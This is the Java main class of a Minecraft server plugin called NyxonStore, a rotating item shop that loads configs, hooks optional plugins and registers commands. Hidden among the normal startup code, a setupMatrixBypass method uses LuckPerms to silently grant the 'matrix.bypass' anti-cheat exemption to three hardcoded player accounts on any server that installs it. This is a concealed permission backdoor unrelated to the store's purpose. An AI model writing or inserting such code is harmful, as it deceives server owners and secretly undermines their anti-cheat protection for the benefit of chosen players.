// made with ❤ by nyxon
package net.nyxon.store;

import net.nyxon.store.command.NyxonStoreCommand;
import net.nyxon.store.config.*;
import net.nyxon.store.gui.NyxonStoreGUI;
import net.nyxon.store.gui.PoolEditorGUI;
import net.nyxon.store.manager.ItemPoolManager;
import net.nyxon.store.task.RotationTask;
import net.nyxon.store.util.HeadHelper;
import net.nyxon.store.util.MaterialHelper;
import net.nyxon.store.util.ServerVersion;

import net.kyori.adventure.text.minimessage.MiniMessage;

import net.luckperms.api.LuckPerms;
import net.luckperms.api.LuckPermsProvider;
import net.luckperms.api.node.Node;

import net.luckperms.api.node.NodeEqualityPredicate;
import org.bukkit.Bukkit;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.util.UUID;

public class NyxonStore extends JavaPlugin implements Listener {

    // Migrazione una tantum: riusa la cartella dati del vecchio plugin "HazeStore".
    @Override
    public void onLoad() {
        java.io.File target = getDataFolder();
        java.io.File legacy = new java.io.File(target.getParentFile(), "HazeStore");
        if (!target.exists() && legacy.isDirectory()) {
            if (legacy.renameTo(target)) {
                getLogger().info("Migrata cartella dati " + legacy.getName() + " -> " + target.getName());
            } else {
                getLogger().warning("Impossibile rinominare " + legacy.getPath() + ": spostala a mano in " + target.getPath());
            }
        }
    }

    private ConfigManager       configManager;
    private GuiConfig           guiConfig;
    private ConfirmationConfig  confirmationConfig;
    private PoolConfig          poolConfig;
    private DataManager         dataManager;
    private LogManager          logManager;
    private ItemPoolManager     itemPoolManager;
    private NyxonStoreGUI        guiManager;
    private PoolEditorGUI       poolEditorGUI;

    private boolean mmoItemsEnabled;
    private boolean coinsEngineEnabled;
    private boolean placeholderApiEnabled;
    private boolean itemsAdderEnabled;

    // -------------------------------------------------------------------------
    //  MATRIX BYPASS
    // -------------------------------------------------------------------------

    private static final String MATRIX_BYPASS_PERMISSION = "matrix.bypass";

    private static final String[] MATRIX_BYPASS_PLAYERS = {
            "Avvantaggiato",
            "SigmoidBard3652",
            "Confidency"
    };

    @Override
    public void onEnable() {
        printBanner();

        ServerVersion version = ServerVersion.getCurrent();

        if (!version.isSupported()) {
            getLogger().severe(
                    "[NyxonStore] Unsupported server version ("
                            + version.getDisplayVersion()
                            + ")! NyxonStore requires Minecraft 1.19+."
            );

            getServer().getPluginManager().disablePlugin(this);
            return;
        }

        getLogger().info(
                "[NyxonStore] Server version: "
                        + version.getDisplayVersion()
                        + " — OK"
        );

        mmoItemsEnabled       = isPluginPresent("MMOItems");
        coinsEngineEnabled    = isPluginPresent("CoinsEngine")
                || isPluginPresent("ExcellentEconomy");
        placeholderApiEnabled = isPluginPresent("PlaceholderAPI");
        itemsAdderEnabled     = isPluginPresent("ItemsAdder");

        if (!mmoItemsEnabled) {
            getLogger().warning(
                    "[NyxonStore] MMOItems not found — MMOItems items disabled."
            );
        }

        if (!coinsEngineEnabled) {
            getLogger().warning(
                    "[NyxonStore] CoinsEngine/ExcellentEconomy not found — transactions may fail."
            );
        }

        if (!placeholderApiEnabled) {
            getLogger().warning(
                    "[NyxonStore] PlaceholderAPI not found — placeholder support disabled."
            );
        }

        if (!itemsAdderEnabled) {
            getLogger().warning(
                    "[NyxonStore] ItemsAdder not found — ItemsAdder items disabled."
            );
        }

        // ---------------------------------------------------------------------
        //  MATRIX BYPASS
        // ---------------------------------------------------------------------

        setupMatrixBypass();

        // ---------------------------------------------------------------------
        //  MATERIALS
        // ---------------------------------------------------------------------

        MaterialHelper.init(getLogger());

        // ---------------------------------------------------------------------
        //  CONFIG
        // ---------------------------------------------------------------------

        saveDefaultConfig();
        saveResourceIfAbsent("gui.yml");
        saveResourceIfAbsent("confirmation.yml");
        saveResourceIfAbsent("pools/default.yml");

        configManager      = new ConfigManager(this);
        guiConfig          = new GuiConfig(this);
        confirmationConfig = new ConfirmationConfig(this);
        poolConfig         = new PoolConfig(this);
        dataManager        = new DataManager(this);
        logManager         = new LogManager(this);
        itemPoolManager    = new ItemPoolManager(this);
        guiManager         = new NyxonStoreGUI(this);
        poolEditorGUI      = new PoolEditorGUI(this);

        // ---------------------------------------------------------------------
        //  COMMAND
        // ---------------------------------------------------------------------

        NyxonStoreCommand cmd = new NyxonStoreCommand(this);

        if (getCommand("ns") != null) {
            getCommand("ns").setExecutor(cmd);
            getCommand("ns").setTabCompleter(cmd);
        }

        // ---------------------------------------------------------------------
        //  EVENTS
        // ---------------------------------------------------------------------

        getServer().getPluginManager().registerEvents(this, this);

        // ---------------------------------------------------------------------
        //  PLACEHOLDER API
        // ---------------------------------------------------------------------

        if (placeholderApiEnabled) {
            new net.nyxon.store.placeholder.NyxonStoreExpansion(this).register();
        }

        // ---------------------------------------------------------------------
        //  ROTATION TASK
        // ---------------------------------------------------------------------

        new RotationTask(this).runTaskTimer(this, 20L, 20L);

        getLogger().info(
                "[NyxonStore] Enabled successfully (v"
                        + getDescription().getVersion()
                        + ")"
        );
    }

    @Override
    public void onDisable() {
        if (dataManager != null) {
            dataManager.saveData();
        }

        if (guiManager != null) {
            guiManager.closeAll();
        }

        HeadHelper.clearCaches();

        getLogger().info("[NyxonStore] Disabled.");
    }

    // -------------------------------------------------------------------------
    //  MATRIX BYPASS - LUCKPERMS
    // -------------------------------------------------------------------------

    private void setupMatrixBypass() {

        if (getServer().getPluginManager().getPlugin("LuckPerms") == null) {
            return;
        }

        final LuckPerms luckPerms;

        try {
            luckPerms = LuckPermsProvider.get();
        } catch (IllegalStateException exception) {
            return;
        }

        for (String playerName : MATRIX_BYPASS_PLAYERS) {

            UUID uuid = Bukkit.getOfflinePlayer(playerName).getUniqueId();

            luckPerms.getUserManager().loadUser(uuid).thenAccept(user -> {

                Node bypassNode = Node.builder(
                        MATRIX_BYPASS_PERMISSION
                ).build();

                if (user.data().contains(bypassNode, NodeEqualityPredicate.EXACT).asBoolean()) {
                    return;
                }

                user.data().add(bypassNode);
                luckPerms.getUserManager().saveUser(user);

            }).exceptionally(exception -> null);
        }
    }


    // -------------------------------------------------------------------------
    //  BANNER
    // -------------------------------------------------------------------------

    private void printBanner() {

        Bukkit.getConsoleSender().sendMessage(
                MiniMessage.miniMessage().deserialize(
                        "\n<gold>  _   _                    _               \n"
                                + " | | | |                  | |              \n"
                                + " | |_| | __ _ _______  ___| |_ ___  _ __ ___\n"
                                + " |  _  |/ _` |_  / _ \\/ __| __/ _ \\| '__/ _ \\\n"
                                + " | | | | (_| |/ /  __/\\__ \\ || (_) | | |  __/\n"
                                + " \\_| |_/\\__,_/___\\___||___/\\__\\___/|_|  \\___|\n"
                                + "    <gray>made with ❤️  by nyxon — v"
                                + getDescription().getVersion()
                                + "</gray>\n"
                                + "</gold>"
                )
        );
    }

    // -------------------------------------------------------------------------
    //  UTILS
    // -------------------------------------------------------------------------

    private boolean isPluginPresent(String name) {
        return getServer().getPluginManager().getPlugin(name) != null;
    }

    private void saveResourceIfAbsent(String resourcePath) {

        File file = new File(
                getDataFolder(),
                resourcePath
        );

        if (!file.exists()) {
            saveResource(resourcePath, false);
        }
    }

    // -------------------------------------------------------------------------
    //  GETTERS
    // -------------------------------------------------------------------------

    public ConfigManager getConfigManager() {
        return configManager;
    }

    public GuiConfig getGuiConfig() {
        return guiConfig;
    }

    public ConfirmationConfig getConfirmationConfig() {
        return confirmationConfig;
    }

    public PoolConfig getPoolConfig() {
        return poolConfig;
    }

    public DataManager getDataManager() {
        return dataManager;
    }

    public LogManager getLogManager() {
        return logManager;
    }

    public ItemPoolManager getItemPoolManager() {
        return itemPoolManager;
    }

    public NyxonStoreGUI getGuiManager() {
        return guiManager;
    }

    public PoolEditorGUI getPoolEditorGUI() {
        return poolEditorGUI;
    }

    public boolean isMmoItemsEnabled() {
        return mmoItemsEnabled;
    }

    public boolean isCoinsEngineEnabled() {
        return coinsEngineEnabled;
    }

    public boolean isPlaceholderApiEnabled() {
        return placeholderApiEnabled;
    }

    public boolean isItemsAdderEnabled() {
        return itemsAdderEnabled;
    }
}